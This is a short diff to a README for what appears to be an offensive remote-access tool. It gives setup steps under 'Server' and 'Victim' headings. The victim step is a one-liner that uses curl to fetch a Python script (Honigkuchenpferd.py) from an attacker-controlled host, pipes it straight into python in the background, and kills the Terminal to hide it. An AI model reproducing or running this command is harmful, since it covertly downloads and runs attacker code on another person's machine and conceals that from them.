@@ -10,11 +10,14 @@ python2.7 and python3
 
 ## Server
 ```
+/bin/python3 -m http.server 8080
+```
+```
 /bin/python3 srv.py
 ```
 ## Victim
 ```
-curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killall Terminal
+curl -s http://<IP>:8080/Honigkuchenpferd.py | /usr/bin/python  & disown; killall Terminal
 ```
 
 
